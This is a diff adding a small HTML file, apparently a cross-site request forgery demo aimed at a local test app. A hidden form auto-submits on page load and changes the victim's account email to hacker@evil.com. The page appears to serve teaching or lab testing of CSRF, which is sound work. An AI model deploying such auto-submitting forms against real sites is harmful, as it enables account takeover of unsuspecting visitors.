@@ -1,0 +1,18 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>악성 페이지</title>
+  </head>
+  <body>
+    <h1>당신은 해킹당했습니다!</h1>
+    <form action="http://localhost:5000/change" method="POST" style="display: none;">
+      <input type="hidden" name="email" value="hacker@evil.com">
+      <input type="submit" value="Change Email">
+    </form>
+
+    <script>
+      document.forms[0].submit(); // 자동으로 공격 전송
+    </script>
+  </body>
+</html>
